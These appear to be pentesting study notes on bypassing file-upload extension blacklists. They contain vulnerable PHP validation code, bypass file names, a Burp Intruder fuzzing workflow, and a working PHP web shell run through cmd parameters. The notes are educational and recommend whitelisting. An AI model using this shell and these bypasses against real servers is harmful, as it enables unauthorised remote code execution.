# File Upload Attacks – Blacklist Filters

## Overview

Some applications attempt to prevent malicious uploads by **blocking dangerous file extensions** on the back-end.

Common approach:

- block `.php`
- block `.asp`
- block `.aspx`
- block `.jsp`

This is known as **blacklist validation**.

However, blacklists are inherently weak because they attempt to block known bad values rather than allow only known safe values.

If the blacklist is incomplete or incorrectly implemented, attackers can bypass it and still upload executable files.

Think of a blacklist like trying to stop intruders by banning specific disguises — attackers can simply wear a different disguise.

---

# 1. What Blacklist Validation Looks Like

Typical back-end logic checks whether the uploaded file extension matches a blocked list.

Example vulnerable code:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

Logic:

1. extract file extension
2. compare against blocked list
3. deny upload if match found

Weakness:

Only extensions explicitly listed are blocked.

Any extension not listed may still execute as code.

---

# 2. Why Blacklists Fail

Blacklist validation fails because:

- developers rarely include every dangerous extension
- alternative extensions may execute the same code
- case sensitivity issues may allow bypass
- new extensions may not be considered
- framework-specific extensions may be overlooked

Example bypasses:

```
shell.phtml
shell.php5
shell.php8
shell.phar
shell.inc
shell.module
```

If the blacklist only blocks `.php`, these variants may still execute.

---

# 3. Case Sensitivity Bypass

Some validation checks are case-sensitive.

Example blocked extension:

```
php
```

Possible bypass:

```
shell.pHp
shell.PhP
shell.PHP
```

Windows servers treat file extensions as case-insensitive.

This means:

```
shell.pHp
```

may still execute as PHP.

---

# 4. Identifying Blacklist Behaviour

When attempting upload bypass:

1. upload normal image
2. intercept request
3. modify extension to `.php`
4. observe server response

Example failure response:

```
Extension not allowed
```

Indicates server-side filtering exists.

Next step:

identify allowed extensions.

---

# 5. Fuzzing File Extensions

We can fuzz file extensions to identify which are allowed.

Goal:

discover executable extensions not blocked by blacklist.

Useful wordlists:

```
SecLists Web Extensions
PayloadsAllTheThings extension lists
PHP extension lists
```

Example location:

```
/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
```

PHP-specific extension lists often contain:

```
.phtml
.php5
.php7
.phar
.inc
.module
```

---

# 6. Burp Intruder Extension Fuzzing

Process:

1. capture upload request
2. send request to Intruder
3. set extension as payload position
4. load extension wordlist
5. execute attack
6. analyse responses

Example fuzz position:

```
filename="HTB§EXT§"
```

Replace extension with payload list.

Important:

disable URL encoding for dot (`.`).

---

# 7. Identifying Successful Extensions

Successful extensions often return:

```
File successfully uploaded
```

Failed extensions return:

```
Extension not allowed
```

Compare response length or message content.

Sort Intruder results by:

```
Length
Status
Response
```

Matching responses may indicate allowed extensions.

---

# 8. Common PHP Executable Extensions

Common alternative PHP extensions:

```
.phtml
.php5
.php7
.php8
.phar
.inc
.module
```

Not all extensions execute on all configurations.

Apache example configuration:

```
AddType application/x-httpd-php .phtml
```

If configured, `.phtml` files execute as PHP.

---

# 9. Exploiting Allowed Extensions

Once allowed extension discovered:

modify upload request.

Example:

```
filename="shell.phtml"
```

File content:

```php
<?php system($_REQUEST['cmd']); ?>
```

Upload file.

If upload succeeds:

```
File successfully uploaded
```

Locate uploaded file.

Example path:

```
/profile_images/shell.phtml
```

Execute command:

```
http://<SERVER_IP>:<PORT>/profile_images/shell.phtml?cmd=id
```

Expected output:

```
uid=33(www-data)
```

Confirms code execution.

---

# 10. Why Alternative Extensions Work

Web servers may treat multiple extensions as executable.

Reasons:

- legacy support
- framework compatibility
- misconfigured handlers
- developer convenience
- backward compatibility

Server configuration determines which extensions execute.

Example Apache handler:

```
AddHandler application/x-httpd-php .php .phtml .php5
```

---

# 11. Extension Fuzzing Workflow

## Step 1 – intercept upload request

Capture normal upload.

## Step 2 – send to Intruder

Target extension field.

## Step 3 – load extension wordlist

Use PHP extension list.

## Step 4 – start fuzzing

Observe response variations.

## Step 5 – identify allowed extensions

Look for success responses.

## Step 6 – upload web shell

Use working extension.

## Step 7 – confirm execution

Test command output.

---

# 12. Other Blacklist Weaknesses

Blacklist validation may fail due to:

- incomplete extension lists
- case-sensitive comparison
- multiple extension parsing
- misconfigured MIME handlers
- improper sanitisation
- developer oversight

Example bypass concepts:

```
shell.php.txt
shell.php.jpg
shell.phtml
shell.php.
shell.php%00.jpg
```

Some servers may interpret these unexpectedly.

---

# 13. Why Whitelisting is Stronger

Blacklist approach:

blocks known bad values.

Whitelist approach:

allows only known safe values.

Example whitelist:

```
.jpg
.png
.gif
```

Whitelist validation reduces attack surface significantly.

---

# 14. Practical Testing Workflow

## Step 1 – attempt upload bypass

Modify extension to `.php`.

## Step 2 – observe error message

Determine validation exists.

## Step 3 – fuzz extensions

Identify allowed executable types.

## Step 4 – upload web shell

Use permitted extension.

## Step 5 – locate uploaded file

Inspect image path.

## Step 6 – execute commands

Confirm RCE capability.

---

# 15. Quick Commands

## PHP web shell

```php
<?php system($_REQUEST['cmd']); ?>
```

## example allowed extension

```
shell.phtml
```

## example execution

```
http://<SERVER_IP>:<PORT>/profile_images/shell.phtml?cmd=whoami
```

## common extension wordlist

```
/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
```

---

# 16. Key Takeaways

- blacklist validation blocks known dangerous extensions
- incomplete blacklists are easily bypassed
- alternative extensions may still execute code
- case sensitivity can allow bypass
- fuzzing extensions helps identify allowed file types
- server configuration determines executable extensions
- blacklist filtering is weaker than whitelist filtering
- file upload flaws often remain exploitable despite filtering attempts

---

# Tags

#file-upload
#blacklist
#bypass
#web-shell
#rce
#php
#burp
#fuzzing
#pentesting
#ctf
#obsidian